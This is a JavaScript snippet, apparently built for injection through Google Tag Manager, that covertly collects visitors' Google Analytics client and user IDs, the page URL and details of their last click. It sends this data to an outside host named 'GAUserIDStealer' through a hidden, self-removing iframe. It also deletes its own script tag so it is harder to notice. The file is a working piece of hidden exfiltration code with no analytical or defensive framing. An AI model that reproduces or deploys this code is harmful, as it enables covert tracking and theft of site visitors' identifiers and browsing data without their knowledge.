function makeid(length) {
   var result           = '';
   var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
   var charactersLength = characters.length;
   for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
}

function getgaCid() {
    var name = "_ga=";
    var decodedCookie = decodeURIComponent(document.cookie);
    var ca = decodedCookie.split(';');
    for(var i = 0; i <ca.length; i++) {
        var c = ca[i];
            while (c.charAt(0) == ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) == 0) {
                return c.substring(name.length+6, c.length);
            }
    }
    return "";
}

    
function removeScript(){
    var ss=document.getElementsByTagName('script');
    for(i=0;i<ss.length;i++){
        if(ss[i].innerHTML.indexOf("function getgaCid()")!==-1){
            ss[i].parentNode.removeChild(ss[i]);
            console.log("Remove script done ver4");
            break;
        }
    }
}

function doFlow(){
    var guhappyId=makeid(5);
    var ifrm_c = document.createElement('iframe');
    ifrm_c.setAttribute('id', guhappyId);
    ifrm_c.setAttribute('class', 'guhappy_steal');
    ifrm_c.style.display = "none";
    document.body.appendChild(ifrm_c);

    var cframe=document.getElementById(guhappyId);
    cframe.addEventListener("load",function(){
        setTimeout(function(){
            console.log("removing guhappy - "+guhappyId);
            cframe.parentNode.removeChild(cframe);
            console.log("remove guhappy - "+guhappyId+" done");
        }, 5000);
        
    });

    uid=-1
    for(i=0;i<dataLayer.length;i++){
        try{
            if('ga_c_id' in dataLayer[i]){
                uid=dataLayer[i]['ga_c_id'];
                break;
            }
        }catch(e){
            console.log("pass");
        }
    }

    elementUrl=""
    elementClasses=""
    elementId=""
    elementText=""
    dataanalyticsID="null"

    for(i=dataLayer.length-1;i>=0;i--){
        if(dataLayer[i]['event']=="gtm.click"){
            //handling eURL
            try{
                if('gtm.elementUrl' in dataLayer[i]){
                    elementUrl=dataLayer[i]['gtm.elementUrl'];
                }
            }catch(e){
                console.log(e);
            }
            
            //handling eClass
            try{
                if('gtm.elementClasses' in dataLayer[i]){
                    elementClasses=dataLayer[i]['gtm.elementClasses'];
                }
            }catch(e){
                console.log(e);
            }

            //handling eID
            try{
                if('gtm.elementId' in dataLayer[i]){
                    elementId=dataLayer[i]['gtm.elementId'];
                }
            }catch(e){
                console.log(e);
            }

            //handling of eTxt
            try{
                if('gtm.element' in dataLayer[i]){
                    if('text' in dataLayer[i]['gtm.element']){
                        elementText=dataLayer[i]['gtm.element']["text"].replace('\n',' ');
                    }else if('textContent' in dataLayer[i]['gtm.element']){
                        elementText=dataLayer[i]['gtm.element']["textContent"].replace('\n',' ');
                    }
                }
            }catch(e){
                console.log(e);
            }

            //handling dID
            try{
                if('gtm.element' in dataLayer[i]){
                    if('dataset' in dataLayer[i]['gtm.element']){
                        if('analytics' in dataLayer[i]['gtm.element'].dataset){
                            dataanalyticsID=dataLayer[i]['gtm.element'].dataset["analytics"];
                        }
                    }
                }
            }catch(e){
                console.log(e);
            }
            break;
        }
    }

    cframe.src ="https://guqima.github.io/GAUserIDStealer/steal.html?uid=="+uid+"&&domain=="+window.location.hostname+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText;
}
